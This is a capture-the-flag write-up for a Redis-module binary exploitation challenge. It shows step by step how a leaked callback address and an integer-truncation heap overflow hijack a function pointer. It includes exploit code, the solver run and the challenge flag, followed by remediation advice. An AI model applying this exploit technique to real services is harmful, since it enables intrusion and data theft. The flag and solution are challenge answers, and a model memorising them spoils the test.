# Chronicle

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Binary Exploitation |
| Points | 223 |
| Author | 夜有夢 |
| Connection | `redis-cli -h chal.thjcc.org -p 6379` |
| Handout | [`artifacts/chronicle-redis-pwn.zip`](artifacts/chronicle-redis-pwn.zip) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}` |

## Overview

Chronicle is a white-box pwn challenge implemented as a native Redis module.
The module schedules short ledger annotations as timer-backed heap objects and
can export or import them through a custom binary archive format.

Two weaknesses combine into a reliable control-flow hijack:

1. `CHRONICLE.SHOW` returns a reversible `ticket` that discloses the address of
   the normal completion callback despite ASLR.
2. `CHRONICLE.IMPORT` truncates a decoded 64-bit body length to eight bits for
   validation, but passes the original full length to `memcpy`.

A 256-byte archive body passes the check because `(uint8_t)256 == 0`. Copying
that body into the task's 80-byte annotation overwrites its completion callback.
The callback is redirected from `commit_annotation` to the module's internal
`materialize_anchor` function. When Redis dispatches the ten-millisecond timer,
that function copies the secret recovery value into the task result. A final
`CHRONICLE.SHOW` returns the flag.

The exploit is binary-safe and uses a small RESP2 client implemented entirely
with Python's standard library.

## 1. Inspecting the Handout

The archive contains the complete service implementation:

```text
chronicle-redis-pwn/
|-- Dockerfile
|-- Makefile
|-- README.md
|-- docker-compose.yml
|-- entrypoint.sh
|-- redis.conf
|-- seed/
|   `-- bootstrap.sh
`-- src/
    |-- chronicle.c
    `-- redismodule.h
```

The original ZIP has SHA-256:

```text
91cba3f3ed54233edf8ba723ead643df3fa703c278dfff3195ce2d45201bf088
```

The build uses Debian Bookworm, Redis 7.2.15, and the following compiler and
linker protections:

```make
CFLAGS := -O2 -fPIC -fstack-protector-strong -fno-omit-frame-pointer \
          -Wall -Wextra -Werror -D_FORTIFY_SOURCE=0
LDFLAGS := -shared -Wl,-z,relro,-z,now,-z,noexecstack
```

The module is position-independent and loaded at a randomized address. Full
RELRO, NX, and stack protection rule out several routine overwrite targets.
The bug is instead in a heap object containing an ordinary C function pointer.

The entrypoint writes the flag to a private file before Redis starts:

```sh
printf '%s\n' "$FLAG" > /tmp/.chronicle-anchor
unset FLAG
```

During module initialization, `load_recovery_value` reads that file into a
module-global buffer. The flag is therefore already present in process memory,
but Redis' ACL does not expose arbitrary file or module-management commands.

## 2. Mapping the Redis Interface

The module registers four custom commands:

```text
CHRONICLE.NEW <delay_ms> <label> <annotation>
CHRONICLE.SHOW <id>
CHRONICLE.EXPORT <id>
CHRONICLE.IMPORT <archive>
```

`NEW` creates a task and schedules a Redis timer. `SHOW` reports its metadata
and result. `EXPORT` serializes a task, while `IMPORT` parses the same archive
format and schedules a reconstructed task.

The entrypoint also creates three benign tasks through `bootstrap.sh`, so a
fresh instance begins with IDs 4101 through 4103. The exploit does not depend
on those IDs: it creates a new task and uses the returned ID.

## 3. Reconstructing the Task Object

The relevant structure from `chronicle.c` is:

```c
typedef void (*ChronicleCompletion)(RedisModuleCtx *ctx, ChronicleTask *task);

struct ChronicleTask {
    uint64_t id;
    uint64_t delay_ms;
    uint32_t state;
    uint32_t kind;
    uint32_t note_length;
    uint32_t label_length;
    uint64_t ticket;
    char label[32];
    unsigned char note[80];
    ChronicleCompletion completion;
    char result[128];
    unsigned char workspace[192];
    ChronicleTask *next;
    RedisModuleTimerID timer_id;
};
```

On x86-64, its important offsets are:

```text
task + 0x000  id
task + 0x008  delay_ms
task + 0x010  state
task + 0x014  kind
task + 0x018  note_length
task + 0x020  ticket
task + 0x028  label[32]
task + 0x048  note[80]
task + 0x098  completion
task + 0x0a0  result[128]
task + 0x120  workspace[192]
task + 0x1e0  next
task + 0x1e8  timer_id
```

The completion pointer begins exactly 80 bytes after `note`. That adjacency is
the central exploitation target.

Normal annotation tasks use `commit_annotation`:

```c
static void commit_annotation(RedisModuleCtx *ctx, ChronicleTask *task) {
    size_t copy_length = task->note_length;
    if (copy_length > NOTE_CAPACITY) copy_length = NOTE_CAPACITY;
    if (copy_length != 0) memcpy(task->result, task->note, copy_length);
    task->result[copy_length] = '\0';
    task->state = CHRONICLE_COMPLETE;
}
```

Recovery tasks use a more interesting callback:

```c
static void materialize_anchor(RedisModuleCtx *ctx, ChronicleTask *task) {
    if (recovery_value_length != 0) {
        memcpy(task->result, recovery_value, recovery_value_length);
    }
    task->result[recovery_value_length] = '\0';
    task->state = CHRONICLE_COMPLETE;
}
```

There is no public command for creating a recovery task. Reaching
`materialize_anchor` through a forged callback is therefore equivalent to
reaching the challenge's win function.

## 4. Recovering a Module Address From the Ticket

Every new task stores a ticket generated from its callback address:

```c
static uint64_t ticket_for(const ChronicleTask *task) {
    uint64_t salt = rotate_left(
        task->id * 0x9e3779b97f4a7c15ULL,
        17U
    );
    return ((uint64_t)(uintptr_t)task->completion) ^ salt;
}
```

`CHRONICLE.SHOW` returns that ticket directly:

```c
RedisModule_ReplyWithLongLong(ctx, (long long)task->ticket);
```

The salt is not secret because the response also contains the task ID. XORing
the ticket with the recomputed salt recovers the full callback address:

```python
MASK64 = (1 << 64) - 1

def rol64(value, amount):
    return ((value << amount) | (value >> (64 - amount))) & MASK64

ticket = show_reply[3] & MASK64
salt = rol64((task_id * 0x9E3779B97F4A7C15) & MASK64, 17)
commit_annotation = ticket ^ salt
```

Masking the signed Redis integer back to 64 bits is important when its high bit
is set. The ticket is only obfuscated, not protected cryptographically.

## 5. Locating the Recovery Callback

The handout builds the module from source with GCC at `-O2`. Comparing the two
callback symbols in the resulting module gives a fixed relative distance:

```text
materialize_anchor - commit_annotation = 0xd0
```

ASLR changes the module base but preserves this intra-module delta. Once
`commit_annotation` has been recovered from the ticket, the win callback is:

```python
materialize_anchor = commit_annotation + 0xD0
```

One successful remote run produced:

```text
commit_annotation:  0x000077aba18e81b0
materialize_anchor: 0x000077aba18e8280
```

The addresses vary across service restarts, but the difference remains `0xd0`.

## 6. Understanding the Archive Format

`CHRONICLE.EXPORT` constructs the following binary format:

| Offset | Size | Meaning |
| ---: | ---: | --- |
| `0x00` | 4 | Magic: `CHRN` |
| `0x04` | 1 | Version: `1` |
| `0x05` | 1 | Kind: `1` (`CHRONICLE_NOTE`) |
| `0x06` | 2 | Reserved zero bytes |
| `0x08` | 4 | Delay in milliseconds, little-endian |
| `0x0c` | 1 | Label length |
| `0x0d` | variable | Label bytes |
| variable | variable | Unsigned LEB128 body length |
| variable | variable | Annotation body |
| final 4 | 4 | FNV-1a checksum, little-endian |

The checksum is ordinary 32-bit FNV-1a over every byte preceding it:

```python
def fnv1a32(data):
    value = 0x811C9DC5
    for byte in data:
        value = ((value ^ byte) * 0x01000193) & 0xFFFFFFFF
    return value
```

This checksum detects accidental corruption but provides no authenticity. An
attacker can freely alter the archive and recompute the checksum.

## 7. Finding the Integer-Truncation Overflow

The importer correctly decodes the body length into a 64-bit integer and
checks that it matches the remaining archive size:

```c
uint64_t body_length = 0;

if (!read_uvarint(&cursor, checksum, &body_length)
    || body_length != (uint64_t)(checksum - cursor)) {
    return RedisModule_ReplyWithError(ctx, "ERR malformed archive");
}
```

The size validation then introduces the vulnerability:

```c
if ((uint8_t)body_length > NOTE_CAPACITY) {
    return RedisModule_ReplyWithError(ctx, "ERR annotation is too large");
}
```

Casting to `uint8_t` discards every bit above the least significant byte. A
body length of 256 becomes zero for this check:

```text
body_length             = 0x0000000000000100
(uint8_t)body_length    = 0x00
NOTE_CAPACITY           = 0x50
0x00 > 0x50             = false
```

The original, untruncated value is then stored and copied:

```c
task->note_length = (uint32_t)body_length;
memcpy(task->note, cursor, (size_t)body_length);
```

The result is a 256-byte copy into an 80-byte field.

## 8. Building a Controlled Overflow

Because the callback is exactly 80 bytes from the start of `note`, the payload
begins with 80 padding bytes followed by the recovered address:

```python
body = b"A" * 80
body += struct.pack("<Q", materialize_anchor)
body = body.ljust(256, b"B")
```

The overwrite has this shape:

```text
body[0:80]       -> task->note
body[80:88]      -> task->completion = materialize_anchor
body[88:216]     -> task->result
body[216:256]    -> beginning of task->workspace
```

The 256-byte copy stops at `task + 0x148`. The linked-list pointer at `0x1e0`
and timer ID at `0x1e8` remain untouched, so the task can still be scheduled,
found by `SHOW`, and dispatched normally. This makes 256 an especially useful
bypass length: it reaches the callback without corrupting scheduler metadata.

The exploit selects the minimum accepted delay, ten milliseconds, and builds
the complete archive:

```python
archive = bytearray(b"CHRN\x01\x01\x00\x00")
archive += struct.pack("<I", 10)
archive += bytes([len(label)]) + label
archive += encode_uvarint(256)
archive += body
archive += struct.pack("<I", fnv1a32(archive))
```

## 9. Triggering the Timer

`CHRONICLE.IMPORT` allocates the task, performs the overflow, and only then
calls `schedule_task`. Redis later invokes this dispatcher:

```c
static void dispatch_task(RedisModuleCtx *ctx, void *data) {
    ChronicleTask *task = data;

    task->timer_id = 0;
    task->state = CHRONICLE_RUNNING;
    if (task->completion == NULL) {
        task->state = CHRONICLE_FAILED;
        return;
    }
    task->completion(ctx, task);
}
```

At dispatch time, `task->completion` is the forged `materialize_anchor`
address. The function copies the process-global recovery value into
`task->result` and marks the task complete.

The exploit waits briefly and asks Redis to show the imported task:

```python
exploit_id = redis.command(
    "CHRONICLE.IMPORT",
    make_archive(materialize_anchor),
)
time.sleep(0.15)
result = redis.command("CHRONICLE.SHOW", exploit_id)
```

The sixth array element is now the flag.

## 10. Complete Exploit Flow

The full attack is:

1. Connect to Redis using binary-safe RESP framing.
2. Create a normal annotation task with a long delay.
3. Call `CHRONICLE.SHOW` and obtain its ID and ticket.
4. Reverse the ticket formula to disclose `commit_annotation`.
5. Add `0xd0` to obtain `materialize_anchor` under ASLR.
6. Build a valid archive whose decoded body length is 256.
7. Place `materialize_anchor` at body offset 80.
8. Recompute the FNV-1a archive checksum.
9. Import the archive and let its ten-millisecond timer fire.
10. Show the imported task and extract its result.

Run the provided solver with:

```bash
python3 solve.py
```

An alternative endpoint can be supplied as positional arguments:

```bash
python3 solve.py chal.thjcc.org 6379
```

A successful execution looks like:

```text
[+] leak task:          4108
[+] commit_annotation:  0x000077aba18e81b0
[+] materialize_anchor: 0x000077aba18e8280
[+] exploit task:       4109 (complete)
THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}
```

## 11. Remediation

The immediate fix is to validate the full decoded integer without narrowing
it:

```c
if (body_length > NOTE_CAPACITY) {
    return RedisModule_ReplyWithError(ctx, "ERR annotation is too large");
}
```

Additional hardening measures include:

- reject values that do not fit the destination field's exact integer type;
- avoid storing writable callback pointers next to attacker-controlled data;
- do not expose reversible encodings of code pointers to untrusted clients;
- use an authenticated archive format if imported data crosses a trust boundary;
- cover boundary values such as 79, 80, 81, 255, 256, and 257 in parser tests.

## Flag

```text
THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}
```
